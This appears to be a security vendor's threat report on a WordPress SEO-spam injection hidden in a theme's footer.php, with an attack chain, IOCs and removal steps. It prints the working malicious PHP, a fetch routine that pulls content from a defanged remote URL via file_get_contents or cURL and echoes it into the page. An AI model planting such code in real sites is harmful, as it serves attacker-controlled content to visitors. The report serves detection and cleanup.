---
title: 'Fetch-Based URL Injection'
slug: 'fetch-based-url-injection'
reportDate: '2026-01-22'
threatType: 'URL Injection'
severity: 'High'
fileHash: 'seo-spam-footer-injection'
detectedPaths: ['footer.php']
screenshots:
  [
    '/images/wordpress-threats/seo-spam-footer-injection_evidence-1.png',
    '/images/wordpress-threats/seo-spam-footer-injection_evidence-2.jpg',
    '/images/wordpress-threats/seo-spam-footer-injection_evidence-3.png',
    '/images/wordpress-threats/seo-spam-footer-injection_evidence-4.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'The site may display spam content, affecting SEO and user trust. It can also open the site to further vulnerabilities if the content fetched is malicious.'
seenOn: 'footer.php of the theme'
behavior: 'Fetches and injects unwanted content from an external source into the website.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: '1'
---

## Technical Analysis

The malware is embedded in the theme's footer.php file. It uses the fetch function, which can utilize file_get_contents and cURL to retrieve content from a remote URL. This content is then injected into the site. The scanners missed it because it employs commonly used PHP functions that don't appear malicious at first glance.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. The footer.php contains a hardcoded URL.
2. It attempts to fetch content from this URL using file_get_contents or cURL.
3. The injected content is then echoed into the site's footer.

## Code Signature(s)

### FILE: `footer.php`

```php
<?php
$url = "hxxps://nawalaku[.]my[.]id/bl/";

function fetch($url) {
    if (ini_get('allow_url_fopen') && ($d = @file_get_contents($url))) return $d;

    if (function_exists('curl_init')) {
        $c = curl_init($url);
        curl_setopt_array($c, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
            CURLOPT_TIMEOUT => 10
        ]);
        $d = curl_exec($c);
        curl_close($c);
        if ($d) return $d;
    }

    $ctx = stream_context_create([
        'http' => ['header' => "User-Agent: Mozilla/5.0\r\n", 'timeout' => 10]
    ]);
    if ($d = @file_get_contents($url, false, $ctx)) return $d;

    return "⚠️ Gagal mengambil konten dari $url";
}

echo fetch($url);


?>

  <?php echo cs_custom_js(); ?>

  </body>
</html>
```

## Indicators of Compromise (IOCs)

- `hxxps://nawalaku[.]my[.]id/bl/`
- `fetch function`
- `CURLOPT_USERAGENT`

## Removal Protocol

1. Remove the malicious fetch function from footer.php.
1. Replace the footer.php file with a clean version from a backup if available.
1. Check for and remove any other suspicious code in the theme files or consider reinstalling the theme.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
